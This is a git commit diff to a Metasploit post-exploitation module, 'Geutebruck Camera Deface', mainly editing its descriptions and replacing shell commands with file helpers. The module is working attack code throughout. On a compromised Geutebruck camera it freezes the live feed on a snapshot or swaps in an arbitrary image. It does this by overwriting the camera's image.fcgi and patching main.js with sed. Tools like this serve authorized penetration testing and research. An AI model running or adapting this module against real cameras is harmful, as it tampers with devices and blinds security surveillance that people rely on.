059198095adccae02d9f5e4239ec445de4031b0a
Grant Willcox <gwillcox@rapid7.com>
2021-09-02 12:44:18 -0500

    First round of edits to module from review process

--- modules/post/linux/manage/geutebruck_post_exp.rb
+++ modules/post/linux/manage/geutebruck_post_exp.rb
@@ -10,44 +10,56 @@ class MetasploitModule < Msf::Post
     super(
       'Name' => 'Geutebruck Camera Deface',
       'Description' => %q{
-        This module will be applied on a session connected to a Geutebruck Camera shell. It will freeze the camera display/deface
-        the display of the camera on the web panel with an image.
+        This module will take an existing session on a vulnerable Geutebruck Camera
+        and will allow the user to either freeze the camera and display the last
+        image from the video stream, display an image on the camera, or restore
+        the camera back to displaying the current feed/stream.
       },
-      'Author' => 'Ibrahim Ayadhi, Sébastien Charbonnier - RandoriSec',
+      'Author' => [
+        'Ibrahim Ayadhi', # RandoriSec - Module, Discovery
+        'Sébastien Charbonnier', # RandoriSec - Module, Discovery
+      ],
       'License' => MSF_LICENSE,
       'Platform' => ['linux'],
       'SessionTypes' => ['shell'],
       'Actions' => [
-        ['FREEZE_CAMERA', { 'Description' => 'It freezes the last image from the video stream' }],
-        ['CHANGE_IMAGE', { 'Description' => 'It replaces the video stream by an arbitrary image' }],
-        ['RESUME_STREAM', { 'Description' => 'It resumes the video stream back to a normal state' }]
+        ['FREEZE_CAMERA', { 'Description' => 'Freeze the camera and display the last image taken from the video stream' }],
+        ['CHANGE_IMAGE', { 'Description' => 'Display an arbitrary image instead of the video stream' }],
+        ['RESUME_STREAM', { 'Description' => "Resume the camera's video stream and display the current live feed" }]
       ],
       'DefaultAction' => 'FREEZE_CAMERA'
     )
 
     register_options(
       [
-        OptString.new('IMAGE', [false, 'Local image path to upload']),
+        OptString.new('IMAGE', [false, 'Full path to the local copy of the image to upload']),
       ]
     )
   end
 
   def run
     print_status('-- Starting action --')
-    send("action_#{action.name.downcase}")
+    case action.name.downcase
+    when 'freeze_camera'
+      action_freeze_camera
+    when 'change_image'
+      action_change_image
+    when 'resume_stream'
+      action_resume_stream
+    end
   end
 
   def action_freeze_camera
     backup_image_fcgi
-    print_status('Taking a snapshot...')
+    print_status('Taking a snapshot of the current stream to use as the static image to freeze the stream on...')
     cmd_exec('curl http://localhost/test/../uapi-cgi/snapshot.fcgi -o /usr/www/uapi-cgi/viewer/image.fcgi')
-    print_status('Freezing the stream...')
+    print_status('Freezing the stream on the captured image...')
     pwn_main_js
     print_status('Stream frozen!')
   end
 
   def action_change_image
-    fail_with(Failure::BadConfig, 'The IMAGE option is required by the CHANGE_IMAGE action.') if datastore['IMAGE'].blank?
+    fail_with(Failure::BadConfig, 'The CHANGE_IMAGE action requires the IMAGE option to be set!') if datastore['IMAGE'].blank?
     backup_image_fcgi
     print_status('Uploading a custom image...')
     upload_file('/usr/www/uapi-cgi/viewer/image.fcgi', datastore['image'])
@@ -57,23 +69,23 @@ class MetasploitModule < Msf::Post
 
   def action_resume_stream
     print_status('Restoring image.fcgi...')
-    cmd_exec('mv /usr/www/uapi-cgi/viewer/image.fcgi.bak /usr/www/uapi-cgi/viewer/image.fcgi')
+    move_file('/usr/www/uapi-cgi/viewer/image.fcgi.bak', '/usr/www/uapi-cgi/viewer/image.fcgi')
     print_status('Restoring main.js backup...')
-    cmd_exec('mv /usr/www/viewer/js/main.js.bak /usr/www/viewer/js/main.js')
+    move_file('/usr/www/viewer/js/main.js.bak', '/usr/www/viewer/js/main.js')
     print_status('Restored! Stream back to a normal state.')
   end
 
   def pwn_main_js
     print_status('Backing up the original main.js...')
-    cmd_exec('cp /usr/www/viewer/js/main.js /usr/www/viewer/js/main2.js')
-    cmd_exec('mv /usr/www/viewer/js/main.js /usr/www/viewer/js/main.js.bak')
+    copy_file('/usr/www/viewer/js/main.js', '/usr/www/viewer/js/main2.js')
+    move_file('/usr/www/viewer/js/main.js', '/usr/www/viewer/js/main.js.bak')
     print_status('Using the new main.js...')
     cmd_exec("sed '/ImageBuf.src = snapshot_url;/ i snapshot_url=\"/uapi-cgi/viewer/image.fcgi\"' -i /usr/www/viewer/js/main2.js")
-    cmd_exec('mv /usr/www/viewer/js/main2.js /usr/www/viewer/js/main.js')
+    move_file('/usr/www/viewer/js/main2.js', '/usr/www/viewer/js/main.js')
   end
 
   def backup_image_fcgi
     print_status('Backing up image.fcgi...')
-    cmd_exec('cp /usr/www/uapi-cgi/viewer/image.fcgi /usr/www/uapi-cgi/viewer/image.fcgi.bak')
+    copy_file('/usr/www/uapi-cgi/viewer/image.fcgi', '/usr/www/uapi-cgi/viewer/image.fcgi.bak')
   end
 end
